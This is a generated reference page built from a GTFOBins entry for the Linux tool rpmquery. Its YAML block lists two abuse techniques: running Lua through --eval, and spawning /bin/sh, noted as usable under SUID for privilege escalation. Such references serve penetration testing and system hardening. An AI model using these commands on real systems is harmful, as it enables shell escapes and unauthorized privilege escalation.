---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# rpmquery

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `rpmquery` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rpmquery` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [rpmquery](../../tools/linux/rpmquery.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rpmquery |
| name | rpmquery |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/rpmquery/ |

## Preserved Source Material

```yaml
_body: ''
_name: rpmquery
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rpmquery
functions:
  inherit:
  - code: rpmquery --eval '%{lua:...}'
    comment: This allows to run Lua code (`...`).
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    from: lua
    version: Some older version is required.
  shell:
  - code: rpmquery --eval '%(/bin/sh 1>&2)'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
